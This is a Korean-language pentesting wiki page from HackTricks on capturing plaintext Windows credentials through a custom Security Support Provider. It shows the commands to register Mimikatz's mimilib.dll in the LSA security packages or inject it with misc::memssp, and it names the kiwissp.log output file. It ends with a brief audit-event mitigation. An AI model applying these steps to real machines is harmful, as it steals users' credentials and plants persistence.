# Custom SSP

{{#include ../../banners/hacktricks-training.md}}

### Custom SSP

[SSP(보안 지원 공급자)가 무엇인지 여기에서 알아보세요.](../authentication-credentials-uac-and-efs/#security-support-provider-interface-sspi)\
자신의 **SSP**를 생성하여 **명확한 텍스트**로 **자격 증명**을 **캡처**할 수 있습니다.

#### Mimilib

Mimikatz에서 제공하는 `mimilib.dll` 바이너리를 사용할 수 있습니다. **이것은 모든 자격 증명을 명확한 텍스트로 파일에 기록합니다.**\
dll을 `C:\Windows\System32\`에 드롭하세요.\
기존 LSA 보안 패키지 목록을 가져옵니다:
```bash:attacker@target
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
`mimilib.dll`를 보안 지원 공급자 목록(보안 패키지)에 추가합니다:
```powershell
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```
재부팅 후 모든 자격 증명은 `C:\Windows\System32\kiwissp.log`에 평문으로 저장됩니다.

#### 메모리 내

Mimikatz를 사용하여 메모리에 직접 주입할 수도 있습니다(약간 불안정하거나 작동하지 않을 수 있습니다).
```powershell
privilege::debug
misc::memssp
```
이것은 재부팅을 견디지 못합니다.

#### 완화

이벤트 ID 4657 - `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`의 감사 생성/변경

{{#include ../../banners/hacktricks-training.md}}
